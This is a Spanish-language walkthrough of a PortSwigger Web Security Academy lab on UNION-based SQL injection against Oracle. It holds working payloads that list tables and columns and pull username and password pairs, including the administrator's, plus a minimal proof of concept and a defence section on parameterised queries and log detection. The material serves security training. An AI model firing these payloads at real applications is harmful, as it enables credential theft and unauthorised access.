# SQL injection attack, listing the database contents on Oracle

**Categoría:** SQLi  
**Dificultad:** Practitioner  
**Fuente:** PortSwigger Web Security Academy

***

# 🎯 Resumen

*   **Objetivo del lab**: Enumerar el contenido de la base de datos Oracle mediante inyección SQL y un ataque `UNION`, para obtener credenciales y autenticarse como administrador.
*   **Vulnerabilidad principal**: SQL Injection en el parámetro `category`.
*   **Impacto esperado**: Exposición de usuarios y contraseñas almacenadas en la base de datos y autenticación como `administrator`.

***

# 🧭 Reconocimiento

*   **Mapa de la aplicación**: `/filter?category=<valor>` filtra productos por categoría.
*   **Parámetro relevante**: `category`.
*   **Consulta SQL sospechada**:

    ```sql
    SELECT * FROM products WHERE category = '<USER_INPUT>' AND released = 1
    ```
*   **Hipótesis**: Si la entrada no está escapada, podemos alterar la consulta y usar `UNION` para extraer datos de otras tablas.

***

# 🛠️ Explotación paso a paso

## Paso 1 – Confirmar la inyección

*   **Qué hago**: Envío `'` al final del valor.
*   **Por qué funciona**: Rompe la consulta, generando error.
*   **Evidencia**: Respuesta con error 500.

***

## Paso 2 – Determinar número de columnas

*   **Qué hago**: Uso `UNION SELECT ...` con valores `NULL` hasta que no haya error. Tener en cuenta que en BBDD Oracle debemos usar la tabla DUAL para que nos funcione la _query_.
*   **Por qué funciona**: Debemos igualar el número y tipos de columnas de la consulta original.
*   **Evidencia**: Respuesta sin error cuando el número de columnas es correcto.

***

## Paso 3 – Enumerar tablas

*   **Payload**:

    ```http
    GET /filter?category=Pets' UNION SELECT table_name,NULL FROM all_tables-- -
    ```
*   **Por qué funciona**: En Oracle, `all_tables` lista todas las tablas accesibles para el usuario actual.
*   **Evidencia**: Identificamos tabla `USERS_EESBFB`.

***

## Paso 4 – Enumerar columnas de la tabla `USERS_EESBFB`

*   **Payload**:

    ```http
    GET /filter?category=Pets' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_EESBFB'-- -
    ```
*   **Evidencia**: Columnas `USERNAME_GHBGYT` y `PASSWORD_JKMFQF`.

***

## Paso 5 – Extraer credenciales (todas las filas)

*   **Payload**:

    ```http
    GET /filter?category=Pets' UNION SELECT USERNAME_GHBGYT||'~'||PASSWORD_JKMFQF,NULL FROM USERS_EESBFB-- -
    ```
*   **Por qué funciona**: Concatenamos usuario y contraseña con `||` para ver pares `usuario~password`.

***

## Paso 6 – **Filtrar solo el administrador con `WHERE` (más preciso)**

*   **Payload final recomendado**:

    ```http
    GET /filter?category=Pets' UNION SELECT USERNAME_GHBGYT||'~'||PASSWORD_JKMFQF,NULL FROM USERS_EESBFB WHERE USERNAME_GHBGYT='administrator'-- -
    ```
*   **Por qué funciona**: Añadimos un `WHERE` en la parte del `UNION` para traer únicamente la fila del administrador, facilitando la identificación de la contraseña sin ruido.
*   **Evidencia**: Obtenemos `administrator~<password>` y podemos autenticarnos en la aplicación.

***

# ✅ PoC mínima

```http
GET /filter?category=Pets' UNION SELECT USERNAME_GHBGYT||'~'||PASSWORD_JKMFQF,NULL FROM USERS_EESBFB WHERE USERNAME_GHBGYT='administrator'-- -
Host: <lab-id>.web-security-academy.net
```

***

# 🔒 Defensa

*   **Causas**: Concatenación directa de entrada en SQL y falta de parametrización.
*   **Detección en logs**:
    *   Parámetros con `UNION SELECT`
    *   Acceso a vistas internas (`all_tables`, `all_tab_columns`)
    *   Aparición de operadores `||` de concatenación en parámetros.
*   **Mitigación recomendada**:
    *   *Prepared statements* / consultas parametrizadas
    *   Validación estricta de entrada y *allow lists*
    *   Principio de mínimo privilegio en la base de datos

***

# 📝 Notas y trampas

*   En Oracle, las vistas de metadatos relevantes son `all_tables` y `all_tab_columns`.
*   La concatenación se hace con `||` (igual que en PostgreSQL).
*   Asegúrate de **igualar tipos**: si una columna no es texto, `NULL` puede requerir *casting*; en estos labs, usar `NULL` y una columna `VARCHAR` en la otra posición suele ser suficiente.
*   El comentario `-- -` (guion guion espacio) evita que el resto de la línea rompa la inyección.

***

# 📚 Referencias

* [PortSwigger Lab – SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
* [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
